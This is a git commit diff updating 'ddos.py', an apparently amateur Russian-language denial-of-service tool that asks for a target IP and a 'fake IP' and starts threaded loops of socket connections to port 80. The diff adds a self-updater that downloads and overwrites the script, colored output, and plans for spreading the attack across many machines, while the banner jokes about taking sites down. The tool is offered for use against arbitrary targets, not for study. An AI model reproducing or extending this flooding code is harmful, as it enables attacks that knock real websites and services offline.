5fdfe5c77ced211507e3e8f3824476fc7c7b4c0f
POHel <91892749+POHel@users.noreply.github.com>
2023-11-11 19:51:24 +0500

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,42 +1,64 @@
-#version 3.0
+#version 3.5
 #by SKATT
-#remake 06.11.2023
-print('version 2.0')
 import os
-os.system('pip install AutoUpdate')
-import AutoUpdate
+print('Установка дополнительных модулей...')
+os.system('pip install requests')
+os.system('pip install colorama')
+print('Импортирую модули...')
+import colorama
 import socket
+import requests
 import threading
 import time
+print('Импортирую цвета...')
+from colorama import Fore
+colorama.init()
 print('Запуск программы...')
-print('version 2.0')
-print('created bySKATT')
+version = 'v3.5'
+print(version)
+print(Fore.GREEN + 'created bySKATT')
 time.sleep(1)
-print('Проверка Обновлений')
-print("данная функция пока тестируется")
-AutoUpdate.set_url('https://github.com/POHel/mini-ddos-programm/edit/main/ddos.py')
-AutoUpdate.set_current_version('3.0')
-AutoUpdate.set_download_link("https://github.com/POHel/mini-ddos-programm/ddos.py")
-print(AutoUpdate.is_up_to_date())
+
+print(Fore.YELLOW + 'Проверка Обновлений')
+VERSION_URL = 'https://api.github.com/repos/POHel/mini-ddos-programm/releases/latest'
+DOWNLOAD_URL = 'https://github.com/POHel/mini-ddos-programm/archive/refs/tags/v3.5.zip'
+
+def update_program(owner, repo, file):
+    response = requests.get(VERSION_URL.format(owner=owner, repo=repo)).json()
+    latest_version = response['tag_name']
+
+    if latest_version != version:
+        print(Fore.YELLOW + '!!!Доступно обновление!!!')
+        download_url = DOWNLOAD_URL.format(owner=owner, repo=repo, file=file)
+        r = requests.get(download_url, allow_redirects=True)
+        open(file, 'wb').write(r.content)
+
+    if latest_version == version:
+        print(Fore.GREEN + 'Установлена самая последняя версия')
+
+if __name__ == '__main__':
+    update_program('POHel', 'mini-ddos-programm', 'ddos.py')
 time.sleep(1)
-print('Определяю OS...')
-time.sleep(0.5)
+
+print(Fore.BLUE + 'Определяю OS...')
+time.sleep(1)
 print('Ваша ос: ', os.name)
-time.sleep(2)
+time.sleep(3)
 if os.name == 'nt':
     os.system('cls')
 else:
     os.system('clear')
-print('created bySKATT')
-print('version 2.0')
-print('''
+print(Fore.GREEN + 'created bySKATT')
+print(Fore.BLUE + 'Ваша ос: ', os.name)
+print(version)
+print(Fore.YELLOW + '''
     !О БУДУЮЩИХ ОБНОВЛЕНИЯХ!
-    В 3 версии хочу добавить пинг чтобы сразу в программе можно было проверить статус IP
-    В 4 версии хочу сделать сервера и клиента для автоматизации запуска программы на всех имеющихся у вас машинах 
+    В 4 версии хочу добавить пинг чтобы сразу в программе можно было проверить статус IP
+    В 5 версии хочу сделать сервера и клиента для автоматизации запуска программы на всех имеющихся у вас машинах 
     (чтобы суммировать вычислительную мощность)
     А дальше можете предложить свою идею
-    ''')
-print('''
+''')
+print(Fore.RED + '''
     Если возникают ошибки, то вот возможные причины:
     1)Плохое соединение с интернетом
     2)Некорректно введён IP адрес
@@ -44,7 +66,8 @@ print('''
     (это хорошо, кто не знает это означает что сервер начал лагать или же это 1 пункт)
     4)Возможно вы положили сайт :)
     (но это не точно)
-    ''')
+''')
+print(Fore.GREEN + '')
 ip = input('введите IP: ')
 fip = input('введите fake IP: ')
 target = ip
@@ -53,6 +76,7 @@ port = 80
 attack_num = 1
 
 def attack():
+    print(Fore.WHITE + '')
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target, port))
